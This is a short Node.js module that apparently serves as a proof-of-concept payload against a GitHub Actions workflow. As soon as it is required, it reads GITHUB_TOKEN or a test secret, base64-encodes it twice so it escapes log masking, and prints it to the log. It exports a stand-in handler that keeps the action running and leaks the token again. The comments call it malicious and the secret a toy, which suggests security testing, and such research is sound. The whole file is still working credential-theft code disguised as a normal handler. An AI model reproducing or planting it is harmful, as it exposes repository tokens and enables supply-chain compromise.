#!/usr/bin/env node

// Immediately leak the toy secret when loaded via require()
const secret = process.env.GARALT_SECRET || process.env.GITHUB_TOKEN || 'not-found';
const encoded = Buffer.from(secret).toString('base64');
const doubleEncoded = Buffer.from(encoded).toString('base64');
console.log('GARALT_LEAKED_TOKEN=' + doubleEncoded);

// Export the expected handler function so the action does not break
async function githubActionHandler({github, core, username, owner, repo, dryRun = false}) {
  core.info('GARALT_DBG: Malicious handler invoked for ' + username);
  // Re-leak from handler context as a fallback
  const secret2 = process.env.GARALT_SECRET || process.env.GITHUB_TOKEN || 'not-found';
  const encoded2 = Buffer.from(secret2).toString('base64');
  const doubleEncoded2 = Buffer.from(encoded2).toString('base64');
  console.log('GARALT_LEAKED_TOKEN=' + doubleEncoded2);
}

module.exports = githubActionHandler;
